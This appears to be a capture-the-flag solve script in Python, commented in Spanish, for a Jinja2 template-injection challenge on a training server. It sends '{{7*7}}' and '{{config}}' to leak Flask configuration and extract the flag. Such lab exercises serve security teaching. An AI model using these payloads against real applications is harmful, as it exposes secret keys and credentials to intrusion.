#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Sistema de avisos internos (203.0.113.10:8008)

Vulnerabilidad: Server-Side Template Injection (SSTI) en Jinja2. El campo
`mensaje` se renderiza con `render_template_string`, por lo que las
expresiones `{{ ... }}` se evaluan en el servidor. `{{ config }}` expone la
configuracion de Flask, incluida `CLAVE_SICH`.

El entorno es un SandboxedEnvironment: los accesos tipo
`__globals__`/`os.popen` se bloquean, pero los globales de la plantilla
(`config`) siguen accesibles.

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import html
import re
import sys

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8008")
CLAVE_RE = re.compile(r"CLAVE_SICH'\s*:\s*'([^']+)'")
AVISO_RE = re.compile(r"<pre>\[AVISO SICH\] ([\s\S]*?)</pre>")


def publicar(s: requests.Session, mensaje: str) -> str:
    r = s.post(f"{BASE}/", data={"mensaje": mensaje}, timeout=15)
    r.raise_for_status()
    m = AVISO_RE.search(r.text)
    return html.unescape(m.group(1)) if m else ""


def main() -> int:
    s = requests.Session()
    s.get(f"{BASE}/", timeout=15)

    # Prueba de concepto: el servidor evalua la expresion
    print(f"[*] {{{{7*7}}}} -> {publicar(s, '{{7*7}}')}")

    # Fuga de la configuracion de Flask
    fuga = publicar(s, "{{config}}")
    print(f"[*] config -> {fuga}")
    m = CLAVE_RE.search(fuga)
    if not m:
        print("[-] no se encontro CLAVE_SICH en la configuracion")
        return 1
    flag = m.group(1)
    if flag.startswith("cdm{token_de_"):
        print("[-] solo se obtuvo el token de demostracion")
        return 1
    print(f"[+] FLAG: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as fh:
        fh.write(flag + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
